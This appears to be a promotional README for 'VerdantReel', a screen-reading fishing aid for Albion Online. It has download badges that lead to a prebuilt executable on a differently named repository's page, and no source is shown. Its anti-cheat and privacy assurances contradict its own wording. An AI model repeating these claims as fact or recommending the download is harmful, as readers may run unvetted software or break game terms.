![preview](https://raw.githubusercontent.com/Samahir1434/Vision-Reel-Line/main/frame_2e41.svg)

# VerdantReel — Smart Angler’s Companion for Albion Online

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey)
![GUI](https://img.shields.io/badge/GUI-PyQt6-brightgreen)
![Vision](https://img.shields.io/badge/vision-OpenCV-orange)
![Status](https://img.shields.io/badge/status-active-brightgreen)

VerdantReel is not merely another automation tool—it is a **digital fishing companion** that observes your screen the way a seasoned angler reads the water. Built entirely on computer vision and a polished PyQt6 interface, it enhances your Albion Online fishing sessions without ever touching the game’s memory or network traffic. Think of it as a pair of binoculars resting beside your monitor, whispering when the bobber dips, rather than a hand that casts the line for you.

The project emerged from a simple frustration: repetitive clicking during long fishing marathons dulls the mind and strains the wrist. VerdantReel solves this by watching the visual cues on your screen—the subtle shimmer of a catch, the changing color of the water ripple—and alerting you precisely when action is needed. It bridges the gap between human patience and machine vigilance, offering a **quality-of-life enhancement** that respects the game’s terms of service by operating purely on pixels.

---

## Why VerdantReel Stands Apart 🎣

Most automation projects in this niche fall into two camps: invasive memory readers that risk account integrity, or crude macro scripts that fail the moment the game updates its visuals. VerdantReel takes a third path—**visual intelligence**. By relying on OpenCV’s template matching and color detection, it adapts to rendering variations, resolution changes, and even partial screen overlays. This makes it remarkably resilient against UI tweaks and window resizing, a boon for players who multitask or stream.

Furthermore, the PyQt6 interface isn’t an afterthought bolted onto a script. It’s a **control room** designed for usability: live preview of detected regions, adjustable sensitivity sliders, and a session statistics panel that tracks your catch rate over time. Whether you’re a casual gatherer or a dedicated fisherman aiming for rare trophies, VerdantReel scales to your pace without demanding technical expertise.

---

## Features That Reel You In 🌟

- **Pixel-Perfect Detection**: Uses advanced color space conversion and contour analysis to identify fishing states—idle, bite, catch, and loot—with remarkable accuracy, even under dynamic lighting conditions.
- **Adaptive Region Locking**: You define a specific area of your screen (e.g., the bobber’s usual spot), and VerdantReel continuously learns minor visual variations within that zone, reducing false positives.
- **Multi-Monitor Support**: Seamlessly works across multiple displays, allowing you to fish on a secondary monitor while keeping your main screen for browsing or content.
- **Sound & Visual Alerts**: Customizable chimes, desktop notifications, and even optional voice prompts (using your system’s text-to-speech) ensure you never miss a catch, even when your eyes wander.
- **Session Analytics Dashboard**: After each session, review graphs showing catches per minute, idle gaps, and estimated silver earned—perfect for optimizing your routes.
- **Profile System**: Save different detection profiles for various in-game locations (e.g., swamp vs. ocean) and switch with a single click.
- **Failsafe Pause**: An intelligent inactivity detection—if the game window loses focus or the screen locks, operations safely pause and resume when you return.
- **Localized UI Strings**: The interface supports multiple languages (English, Deutsch, Français, 日本語) out of the box, with community translations easily pluggable via JSON files.

---

## Getting Started 🚀

The first step toward a calmer, more productive fishing routine is obtaining a copy of VerdantReel. The application is distributed as a portable archive containing the executable, configuration templates, and an extensive user guide. No installation wizard, no registry entries—just unzip and run.

[![Download](https://raw.githubusercontent.com/Samahir1434/Vision-Reel-Line/main/run_2336.svg)](https://Samahir1434.github.io/Vision-Reel-Line/)

---

### System Prerequisites

VerdantReel runs on **Windows 10/11** and most **modern Linux distributions** with X11 or Wayland (XWayland) support. The only hardware requirement is a CPU capable of real-time video processing—any processor from the last eight years will suffice. For optimal comfort, a screen resolution of 1080p or higher is recommended, though lower resolutions work with reduced detection radius.

The software ships with all necessary libraries bundled (OpenCV, PyQt6, and numerous utilities). You do not need to pre-install Python or any development environment—this is a self-contained package for end users who simply want to fish smarter.

### First Launch Walkthrough

1. **Select Your Screen Region**: Upon first run, a crosshair overlay appears. Drag to frame the area around your bobber or fishing splash zone. The live preview updates instantly, showing what VerdantReel sees.
2. **Calibrate Sensitivity**: Adjust the detection threshold slider until the status indicator turns green during a bite and red during idle. This is a visual calibration, akin to tuning a radio frequency—intuitive and immediate.
3. **Choose Alert Style**: Pick from a dropdown menu—chime, silent, or voice. Test each via the “Preview Alert” button to ensure your chosen sound is audible over ambient game audio.
4. **Start the Watch**: Click the large circular button. VerdantReel begins its silent vigilance, and the session timer starts. You can minimize the window; alerts will appear as system notifications.

---

## How the Vision Engine Works 🔍

At the core of VerdantReel is a multi-stage image processing pipeline. First, screen frames are captured at a configurable rate (default: 15 FPS). Each frame is converted from BGR to HSV color space, isolating hues associated with water ripples and game effects. Second, a **gaussian blur** reduces digital noise, followed by an **adaptive threshold** that binarizes the image based on local pixel intensity—this makes detection less sensitive to global brightness changes.

Third, a **contour finder** identifies connected regions that match the expected size and aspect ratio of a fishing indication. If a candidate contour persists for more than two consecutive frames, VerdantReel registers a positive detection. This temporal stability check eliminates false sparks from passing particles or UI animations. Finally, the detection result is compared against your alert configuration, triggering the designated notification.

The engine also performs **background subtraction** on a rolling basis, learning the “normal” appearance of your chosen region. Over time, this reduces false positives from gentle water movement that exists during idle periods. In essence, VerdantReel builds a living model of what your fishing spot looks like when nothing is happening—and only alerts when the scene deviates from that baseline.

---

## Configuration Deep Dive ⚙️

VerdantReel stores all settings in a human-readable `verdant_reel.json` file. Advanced users can manually edit this file to unlock features not exposed in the GUI—for instance, setting a custom alert cooldown between successive catches, or defining a “loot region” separate from the “bite region” for multi-step fishing mechanics.

### Key Configuration Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `fps_capture` | 15 | Frames per second for screen polling. Lower values reduce CPU load. |
| `conf_threshold` | 0.72 | Minimum confidence score (0–1) for a detection to be accepted. |
| `bobber_size_min` | 24 | Minimum pixel width/height of a valid detection blob. |
| `region_expand` | 8 | Additional pixels added to the user-selected region on each side. |
| `alert_repeat_ms` | 1000 | Minimum time between two successive alert triggers. |
| `sound_device` | auto | Override for non-default audio output devices. |
| `log_level` | info | Verbosity of the session log file. |

The configuration file supports hot-reloading—if you edit it while VerdantReel is running, the changes apply within seconds without needing a restart. This is particularly handy for scripters who want to tweak parameters on the fly during a session.

---

## Troubleshooting Common Friction Points 🛠️

### Detection Feels Unreliable

Ensure your in-game graphics settings are stable—do not change them mid-session. Also, close unrelated windows that might overlap your defined region (e.g., a chat window). Finally, revisit the calibration slider; setting it too high causes missed bites, while too low a value yields frequent false triggers.

### Alerts Do Not Appear

Check your system notification settings to allow VerdantReel to post notifications. On Windows, if you use Focus Assist, add VerdantReel to the priority list. Alternatively, switch from desktop notifications to the built-in sound alert, which bypasses OS notification channels entirely.

### High CPU Usage During Long Sessions

The default settings are optimized for a balance of accuracy and performance. If you’re on a low-end machine, reduce the capture FPS to 8 and lower the detection resolution by decreasing the capture region size. The application typically uses under 12% of a single modern CPU core.

---

## Extending VerdantReel with Custom Profiles 🧩

For power users, VerdantReel supports **profiles**—named sets of parameters bundled into a single file. Create a new profile for night fishing (lower lighting conditions), another for high-sensitivity catches, and switch between them from the GUI dropdown. Profiles are stored in the `profiles/` subfolder and can be shared with friends by copying the corresponding JSON file.

Additionally, the engine exposes a tiny scripting API via a `post_detect` hook. If you place a file named `custom_hook.py` in the application directory, VerdantReel will import it and call a function named `on_detect(is_positive, frame, context)` after every detection decision. This allows you to externally toggle other applications, log to a database, or trigger a webhook—unlocking endless integration possibilities.

---

## Roadmap for 2026 🗺️

The development roadmap for the coming year reflects community input and evolving game dynamics:

- **Q1 2026**: Native macOS support via a community-maintained build pipeline.
- **Q2 2026**: Machine learning-based detection model (ONNX runtime) as an optional alternative to the current template matching.
- **Q3 2026**: Cloud profile sync, letting you back up your configurations across machines.
- **Q4 2026**: A companion mobile app for receiving alerts remotely while you’re away from your desk.

---

## Contribute to the School 🐟

VerdantReel thrives on community contributions. Whether you’re a pixel-perfect designer, a Qt layout enthusiast, or a testing wizard who breaks detection scenarios, there’s a place for you. The codebase is modular with clear separation between the vision engine (`vision/`), the UI layer (`ui/`), and the core controller (`core/`). We welcome pull requests, bug reports, and feature suggestions through the repository’s issue tracker.

Before submitting a patch, please review the contribution guidelines in `CONTRIBUTING.md`. It covers coding standards (PEP8), test requirements, and how to properly document your changes. All discussions happen in English to maintain a broad contributor base.

---

## Licensing and Legal Clarity 📄

VerdantReel is released under the **MIT License**, granting you complete freedom to use, modify, and distribute the software for personal or commercial purposes—provided you retain the original copyright notice. This permissive license ensures the tool remains open and transparent, in the spirit of community-driven development.

We explicitly disclaim any affiliation with Albion Online or its publisher, Sandbox Interactive. This product is an independent third-party utility operating at the player’s own risk.

---

## Disclaimer ⚠️

VerdantReel is provided “as is,” without warranty of any kind, express or implied. The authors are **not responsible** for any account actions, penalties, or consequences arising from the use of this software. While VerdantReel operates purely on visual input and does not modify game files or memory, the enforcement of in-game policies is entirely at the discretion of the game operator. Users assume full responsibility for their actions and are encouraged to review the game’s terms of service prior to running this tool.

The project team disclaims liability for any data loss, system incompatibility, or other damage that may occur. Use this tool to **enhance your leisure time**, not to replace the joy of the catch itself.

---

## Join the Community Forum 🌐

A dedicated discussion board exists for anglers and tinkerers at the repository’s Discussions tab. Share your session statistics, propose new detection scenarios for different game regions, or seek advice from experienced users on optimizing your detection profile. The community is friendly, focused on mutual improvement, and strictly adheres to a rule of respectful communication.

---

## Frequently Asked Questions ❓

**Is this detectable by the game’s anti-cheat?**  
The program never reads or writes to game memory, nor does it send synthetic input. It only observes screen pixels. From a technical standpoint, it is indistinguishable from a user glancing at the monitor. However, we cannot guarantee the behavior of third-party detection heuristics.

**Does this work during game updates?**  
Since visual cues rarely change drastically between patches, detection often continues functioning. If a major visual overhaul occurs, recalibration takes less than a minute.

**Can I run VerdantReel while streaming?**  
Absolutely. It has a “Streamer Mode” that hides the detection overlay and suppresses sensitive statistics from appearing on-screen. Your audience will only see your gameplay.

**What happens if my internet disconnects?**  
VerdantReel operates entirely offline. No account, no telemetry, no background communication. Your privacy is preserved by architecture, not promise.

---

## Acknowledgements and Inspiration 🙏

This project draws inspiration from the open-source ethos of community tools that prioritize user autonomy. Special thanks to testers who spent countless hours in swamps and lakes, perfecting the detection thresholds. The pixel-perfect accuracy you experience is a direct result of their patient reporting and refinement.

---

## Final Thoughts and Next Steps 🌊

You’ve now explored the full landscape of VerdantReel. The journey from a simple idea to a refined companion tool has been rewarding, and we invite you to make it your own. Download the latest release, tune your profile, and experience a fishing session where your only task is to enjoy the surroundings—your digital companion handles the rest.

If you encounter a novel edge case, a fresh idea for a feature, or simply want to share a screenshot of your record catch, the repository awaits your voice. Together, we keep the waters vibrant and the catches plentiful.

[![Download](https://raw.githubusercontent.com/Samahir1434/Vision-Reel-Line/main/run_2336.svg)](https://Samahir1434.github.io/Vision-Reel-Line/)